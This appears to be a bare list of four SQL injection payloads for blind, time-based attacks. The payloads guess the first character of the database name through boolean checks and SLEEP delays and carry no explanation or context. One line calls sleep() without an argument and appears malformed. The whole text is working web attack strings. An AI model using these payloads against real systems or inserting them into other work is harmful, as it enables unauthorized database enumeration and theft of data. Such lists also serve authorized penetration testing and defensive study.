' OR SUBSTRING(database(), 1, 1) = 'a' -- 
'; if substring(database(), 1, 1) = 'a' sleep()

'; IF (1=2) SLEEP(1);

' or (case when substring((select database() limit 0,1),1,1)='a' then sleep(1) else 1 end)=1 -- 